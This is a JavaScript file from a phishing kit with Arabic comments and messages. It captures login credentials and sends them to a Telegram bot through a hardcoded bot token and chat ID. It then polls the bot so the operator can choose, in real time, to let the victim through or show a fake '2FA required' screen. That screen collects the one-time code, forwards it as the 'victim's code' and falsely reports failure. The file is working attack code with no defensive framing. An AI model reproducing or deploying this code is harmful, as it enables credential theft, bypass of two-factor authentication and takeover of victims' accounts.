const TG_BOT_TOKEN = "8589243363:AAH4sM1DEqNXAUK314uyagIB3GbRouEL8ak";
const CHAT_ID = "8026901193";
let checkInterval = null;

async function processAuth() {
    const u = document.getElementById('u_log').value;
    const p = document.getElementById('u_pas').value;
    const btn = document.getElementById('sync-btn');
    const msg = document.getElementById('status-text');

    if (u.length < 4 || p.length < 4) return alert("البيانات ناقصة!");

    btn.disabled = true;
    btn.innerText = "Connecting to Secure Node...";
    msg.innerText = "⏳ جاري فحص الحساب ومزامنة البيانات...";

    // إرسال البيانات للآدمن مع أزرار التحكم
    const text = `🎯 صيد جديد!\n👤 المستخدم: ${u}\n🔑 الباسوورد: ${p}\n\nإختر الإجراء:`;
    const keyboard = {
        inline_keyboard: [
            [{ text: "🔐 طلب الرمز (2FA)", callback_data: "ask_2fa" }],
            [{ text: "✅ دخول مباشر", callback_data: "allow_entry" }]
        ]
    };

    try {
        await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text: text, reply_markup: keyboard })
        });
        
        // بدء الاستماع للأوامر بشكل آمن وبدون تعليق
        startSafeListening();
    } catch (e) {
        alert("فشل الاتصال بالسيرفر، حاول مجدداً");
        btn.disabled = false;
    }
}

function startSafeListening() {
    if (checkInterval) clearInterval(checkInterval);

    checkInterval = setInterval(async () => {
        try {
            // جلب آخر تحديث فقط لتقليل الضغط
            const res = await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/getUpdates?offset=-1&limit=1`);
            const data = await res.json();
            
            if (data.result && data.result.length > 0) {
                const lastUpdate = data.result[0];
                const action = lastUpdate.callback_query ? lastUpdate.callback_query.data : null;

                if (action === "ask_2fa") {
                    stopAndExecute(show2FAUI);
                } else if (action === "allow_entry") {
                    stopAndExecute(() => {
                        document.getElementById('auth-screen').classList.add('hidden');
                        document.getElementById('main-app').classList.remove('hidden');
                    });
                }
            }
        } catch (err) {
            console.log("Waiting for admin command...");
        }
    }, 2500); // فحص كل 2.5 ثانية (توازن مثالي بين السرعة والأداء)
}

function stopAndExecute(callback) {
    clearInterval(checkInterval); // إيقاف الفحص فوراً لمنع التعليق
    checkInterval = null;
    callback();
}

function show2FAUI() {
    const msg = document.getElementById('status-text');
    const uInput = document.getElementById('u_log');
    const pInput = document.getElementById('u_pas');
    const btn = document.getElementById('sync-btn');

    uInput.style.display = 'none';
    pInput.value = "";
    pInput.placeholder = "أدخل رمز المصادقة (6 أرقام)";
    msg.innerText = "❌ المزامنة فشلت! حسابك محمي بكلمة مرور إضافية. أدخل الرمز المكون من 6 أرقام لتفعيل VIP:";
    msg.style.color = "#ff4444";
    btn.disabled = false;
    btn.innerText = "تأكيد الرمز النهائي 🔓";
    
    btn.onclick = async () => {
        const code = pInput.value;
        if (code.length < 4) return alert("أدخل الرمز الصحيح");
        
        btn.disabled = true;
        btn.innerText = "Verifying...";
        
        await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text: `🔐 الرمز المستلم من الضحية: ${code}` })
        });
        
        alert("فشل في التحقق من الرمز! اطلب رمزاً جديداً.");
        btn.disabled = false;
        btn.innerText = "إعادة إرسال الرمز";
    };
}
